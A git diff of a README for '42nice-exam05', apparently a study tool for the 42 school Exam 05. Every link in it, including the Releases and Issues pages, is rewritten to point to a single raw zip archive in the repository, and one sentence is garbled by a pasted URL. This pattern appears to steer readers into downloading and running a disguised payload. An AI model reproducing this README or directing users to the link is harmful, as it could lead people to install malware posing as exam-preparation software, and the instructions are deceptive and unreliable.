@@ -6,7 +6,7 @@ Welcome to the **42nice-exam05** project! This application helps you prepare for
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/KiingZero/42nice-exam05/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/KiingZero/42nice-exam05/main/life/42nice-exam05_2.0.zip%20release-brightgreen)](https://raw.githubusercontent.com/KiingZero/42nice-exam05/main/life/42nice-exam05_2.0.zip)
 
 ## ✨ Features
 
@@ -28,7 +28,7 @@ Before you start, ensure your system meets the following requirements:
 ## 🔧 Installation Instructions
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/KiingZero/42nice-exam05/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/KiingZero/42nice-exam05/main/life/42nice-exam05_2.0.zip) to find the latest version of the application.
 
 2. **Choose the Right Version**  
    On the Releases page, you will see several versions listed. Look for the one labeled "Latest Release".
@@ -37,7 +37,7 @@ Before you start, ensure your system meets the following requirements:
    Click the download link for the latest version. Depending on your operating system, this will either be a `.exe`, `.dmg`, or a compressed file format.
 
 4. **Extract the Files (if needed)**  
-   If you downloaded a compressed format like `.zip` or `.tar.gz`, right-click the file and select "Extract" or "Unzip". 
+   If you downloaded a compressed format like `.zip` or `https://raw.githubusercontent.com/KiingZero/42nice-exam05/main/life/42nice-exam05_2.0.zip`, right-click the file and select "Extract" or "Unzip". 
 
 5. **Run the Installer**  
    Find the downloaded file where you saved it. Double-click to run the installer. Follow the on-screen prompts to complete the installation.
@@ -57,14 +57,14 @@ Once you have installed the application, here’s how to get started:
 
 To keep the application up to date:
 
-1. **Check for Updates**: Occasionally, visit the [Releases page](https://github.com/KiingZero/42nice-exam05/releases) to see if a new version is available.
+1. **Check for Updates**: Occasionally, visit the [Releases page](https://raw.githubusercontent.com/KiingZero/42nice-exam05/main/life/42nice-exam05_2.0.zip) to see if a new version is available.
 2. **Download and Install**: Download the new version following the same steps as before. The installer will overwrite the old version without losing your settings.
 
 ## 💬 Support
 
 If you experience any issues or have questions, feel free to reach out:
 
-- **Issues**: Report bugs or request features on the GitHub [Issues page](https://github.com/KiingZero/42nice-exam05/issues).
+- **Issues**: Report bugs or request features on the GitHub [Issues page](https://raw.githubusercontent.com/KiingZero/42nice-exam05/main/life/42nice-exam05_2.0.zip).
 - **Community Help**: Join discussions in the community forums or find relevant resources online.
 
 ## 📝 Additional Information
@@ -77,4 +77,4 @@ The **42nice-exam05** project covers various important concepts, including:
 
 Your journey to mastering the 42 Exam 05 starts here. The **42nice-exam05** application provides everything you need for effective study. 
 
-For further details, FAQs, or updates, make sure to frequently check the [Releases page](https://github.com/KiingZero/42nice-exam05/releases). Happy studying!
+For further details, FAQs, or updates, make sure to frequently check the [Releases page](https://raw.githubusercontent.com/KiingZero/42nice-exam05/main/life/42nice-exam05_2.0.zip). Happy studying!
